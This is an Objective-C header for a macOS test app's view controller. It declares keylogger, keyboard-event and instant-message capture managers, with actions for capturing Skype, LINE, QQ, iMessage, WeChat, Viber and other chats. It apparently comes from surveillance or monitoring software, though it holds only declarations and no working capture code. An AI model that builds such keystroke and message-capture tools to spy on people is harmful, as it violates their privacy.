//
//  ViewController.h
//  TestApp
//
//  Created by Makara Khloth on 2/9/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import <Cocoa/Cocoa.h>

@class IMCaptureManagerForMac, KeyboardLoggerManager, KeyboardEventHandler;

@interface ViewController : NSViewController {
    KeyboardEventHandler *mKeyboardEventHandler;
    KeyboardLoggerManager *mKeyboardLoggerManager;
    IMCaptureManagerForMac *mIMCaptureManager;
}

- (IBAction)startCapture:(id)sender;
- (IBAction)stopCapture:(id)sender;

- (IBAction)skype:(id)sender;
- (IBAction)line:(id)sender;
- (IBAction)qq:(id)sender;
- (IBAction)iMessages:(id)sender;
- (IBAction)aim:(id)sender;
- (IBAction)viber:(id)sender;
- (IBAction)wechat:(id)sender;
- (IBAction)trillian:(id)sender;
- (IBAction)spotlight:(id)sender;

@end

